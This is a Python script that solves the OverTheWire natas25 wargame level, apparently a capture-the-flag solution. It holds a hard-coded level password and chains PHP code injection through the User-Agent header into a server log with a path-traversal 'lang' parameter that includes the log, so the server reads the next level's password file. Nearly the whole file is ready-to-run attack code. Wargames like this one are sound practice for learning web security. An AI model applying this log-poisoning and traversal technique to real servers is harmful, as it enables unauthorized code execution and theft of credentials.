

import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas25.natas.labs.overthewire.org'

AUTH = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

session_id = '8vffkl863u0deqf5ljf98s2'

headers = {
    'User-Agent': '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}

r = requests.post(TARGET_URL, data={
    'lang': '..././' * 10 + 'etc/natas_webpass/natas26'
}, cookies={'PHPSESSID':session_id}, auth=AUTH, headers=headers)

r = requests.post(TARGET_URL, data={
    'lang': '..././' * 10 + 'tmp/natas25_%s.log' % session_id
}, cookies={'PHPSESSID':session_id}, auth=AUTH)
print r.text
